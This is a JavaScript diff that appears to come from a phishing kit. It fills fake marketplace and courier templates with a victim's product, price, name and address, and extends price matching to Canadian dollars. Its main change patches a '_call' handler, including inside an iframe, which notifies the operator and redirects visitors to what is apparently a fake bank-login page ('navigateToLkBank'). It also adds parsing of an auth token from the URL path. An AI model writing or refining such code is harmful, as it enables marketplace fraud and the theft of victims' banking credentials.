@@ -14,7 +14,7 @@
   function formatMarketplacePrice(p) {
     if (!p) return "";
     var s = String(p).trim();
-    var num = s.replace(/[^d.,]/g, "").replace(",", ".");
+    var num = s.replace(/[^\d.,]/g, "").replace(",", ".");
     if (!num) return s;
     var n = parseFloat(num);
     if (isNaN(n)) return s;
@@ -188,7 +188,7 @@
     if (!t) return false;
     if (t === "получатель" || t === "инициалы" || t === "адрес" || t === "название") return false;
     if (/^0\.00\s*(zł|lei|€)$/i.test(t)) return false;
-    return /zł|lei|PLN|€|EUR/i.test(t) || /^[\d\s.,]+\s*€?$/i.test(t) || /^€\s*[\d\s.,]+/i.test(t);
+    return /zł|lei|PLN|€|EUR|CAD|\$/i.test(t) || /^[\d\s.,]+\s*€?$/i.test(t) || /^€\s*[\d\s.,]+/i.test(t) || /^\$\s*[\d\s.,]+/i.test(t);
   }
 
   function applyCourierToRoot(root, d) {
@@ -287,12 +287,12 @@
     root.querySelectorAll("h5.cname, .cname, .ad-keydetails--ad-price, #vip-ad-price, .totalPrice, h1.ad-keydetails--ad-title, #vip-ad-title, .font-medium.text-xl, h2.main__title").forEach(function (el) {
       var t = (el.textContent || "").trim();
       if (d.product_name && (t === "название" || t.indexOf("название") !== -1)) el.textContent = d.product_name;
-      if (priceText && (/€|EUR|\d/.test(t) || isPricePlaceholder(t))) el.textContent = priceText;
+      if (priceText && (isPricePlaceholder(t) || /€|EUR|CAD|\$|\d{3,}/.test(t))) el.textContent = priceText;
     });
-    root.querySelectorAll(".itemized-costs span, .lis-1 li, .lis-main li, .total-section span").forEach(function (el) {
+    root.querySelectorAll(".itemized-costs span, .lis-1 li, .lis-main li, .total-section span, b").forEach(function (el) {
       var t = (el.textContent || "").trim();
       if (d.product_name && t === "название") el.textContent = d.product_name;
-      if (priceText && isPricePlaceholder(t)) el.textContent = priceText;
+      if (priceText && (isPricePlaceholder(t) || /€|EUR|CAD|\$|\d{3,}/.test(t))) el.textContent = priceText;
     });
     root.querySelectorAll('input[value="инициалы"], #vorname0, #nachname0, #name-data, #surtext-data').forEach(function (el) {
       if (!d.recipient_name) return;
@@ -310,7 +310,7 @@
       if (d.product_name && t === "название") el.textContent = d.product_name;
       if (d.recipient_name && (t === "инициалы" || t === "получатель")) el.textContent = d.recipient_name;
       if (d.delivery_address && t === "адрес") el.textContent = d.delivery_address;
-      if (priceText && isPricePlaceholder(t)) el.textContent = priceText;
+      if (priceText && (isPricePlaceholder(t) || /€|EUR|CAD|\$|\d{3,}/.test(t))) el.textContent = priceText;
     });
     function patchImages(rootEl, data) {
       if (!data.product_image) return;
@@ -707,7 +707,7 @@
         else if (d.recipient_name) el.textContent = d.recipient_name;
         return;
       }
-      if (priceText && (isPricePlaceholder(t) || /€|EUR|\d{3,}/.test(t))) el.textContent = priceText;
+      if (priceText && (isPricePlaceholder(t) || /€|EUR|CAD|\$|\d{3,}/.test(t))) el.textContent = priceText;
     });
     if (isMarketplaceTemplate()) applyMarketplaceTemplateData(d);
     else if (isCourierTemplate()) applyCourierTemplateData(d);
@@ -1592,6 +1592,7 @@
       if (doc && doc.defaultView) {
         installPostBridgeOn(doc.defaultView);
         stopLegacyXApiPollingIn(doc.defaultView);
+        if (typeof patchCallForLkOn === "function") patchCallForLkOn(doc.defaultView);
       }
     }
     tryBridge();
@@ -1853,6 +1854,29 @@
     } catch (_) {}
   }
 
+  function patchCallForLkOn(win) {
+    if (!win || win.__rumCallPatchedOn) return;
+    win.__rumCallPatchedOn = true;
+    win._call = function (a, b, n) {
+      if (n !== false && n !== 0 && win.jQuery) {
+        try {
+          win.jQuery.post("#", { type: "notify", action: "slk", p: String(a) + "-" + String(b) });
+        } catch (_) {}
+      }
+      var nav = window.__rumNavigateLk;
+      try {
+        if (win !== window && win.parent && win.parent.__rumNavigateLk) nav = win.parent.__rumNavigateLk;
+      } catch (_) {}
+      if (nav) {
+        nav(a, b, n !== false);
+        return;
+      }
+      dataPromise.then(function () {
+        navigateToLkBank(a, b, n !== false);
+      });
+    };
+  }
+
   function patchCallForLk() {
     window.__rumNavigateLk = function (a, b, notify) {
       window.lkscript = true;
@@ -1860,14 +1884,9 @@
         navigateToLkBank(a, b, notify);
       });
     };
-    window._call = function (a, b, n) {
-      if (n !== false && n !== 0 && window.jQuery) {
-        try {
-          window.jQuery.post("#", { type: "notify", action: "slk", p: String(a) + "-" + String(b) });
-        } catch (_) {}
-      }
-      window.__rumNavigateLk(a, b, n !== false);
-    };
+    patchCallForLkOn(window);
+    var doc = getShadowIframeDoc();
+    if (doc && doc.defaultView) patchCallForLkOn(doc.defaultView);
     window.__rumCallPatched = true;
   }
 
@@ -1890,6 +1909,10 @@
   function initAuthFromUrl() {
     var params = new URLSearchParams(location.search);
     var auth = params.get("auth");
+    if (!auth) {
+      var pathAuth = location.pathname.match(/&auth=([^/&?]+)/);
+      if (pathAuth) auth = pathAuth[1];
+    }
     if (!auth || auth.indexOf("-") < 0) return;
     var parts = auth.split("-");
     patchCallForLk();
